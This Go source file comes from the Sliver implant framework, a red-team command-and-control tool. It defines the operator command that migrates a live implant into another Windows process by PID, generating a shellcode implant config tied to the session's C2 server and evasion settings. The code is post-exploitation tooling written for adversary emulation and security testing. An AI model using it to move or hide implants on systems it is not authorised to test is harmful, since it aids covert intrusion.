package windows

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	cctx "github.com/bishopfox/sliver/client/context"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// Migrate - Migrate into a remote process
type Migrate struct {
	Positional struct {
		PID uint32 `description:"PID of process to migrate into" required:"1-1"`
	} `positional-args:"yes" required:"yes"`
}

// Execute - Migrate into a remote process
func (m *Migrate) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	pid := m.Positional.PID
	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
	}
	config := getActiveSliverConfig()
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Migrating into %d ...", pid)
	go spin.Until(msg, ctrl)
	migrate, err := transport.RPC.Migrate(context.Background(), &clientpb.MigrateReq{
		Pid:     pid,
		Config:  config,
		Request: cctx.Request(session),
	})

	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return
	}
	ctrl <- true
	<-ctrl
	if !migrate.Success {
		fmt.Printf(util.Error+"%s\n", migrate.GetResponse().GetErr())
		return
	}
	fmt.Printf("\n"+util.Info+"Successfully migrated to %d\n", pid)
	return
}

func getActiveSliverConfig() *clientpb.ImplantConfig {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return nil
	}
	c2s := []*clientpb.ImplantC2{}
	c2s = append(c2s, &clientpb.ImplantC2{
		URL:      session.GetActiveC2(),
		Priority: uint32(0),
	})
	config := &clientpb.ImplantConfig{
		Name:    session.GetName(),
		GOOS:    session.GetOS(),
		GOARCH:  session.GetArch(),
		Debug:   true,
		Evasion: session.GetEvasion(),

		MaxConnectionErrors: uint32(1000),
		ReconnectInterval:   uint32(60),

		Format:      clientpb.ImplantConfig_SHELLCODE,
		IsSharedLib: true,
		C2:          c2s,
	}
	return config
}
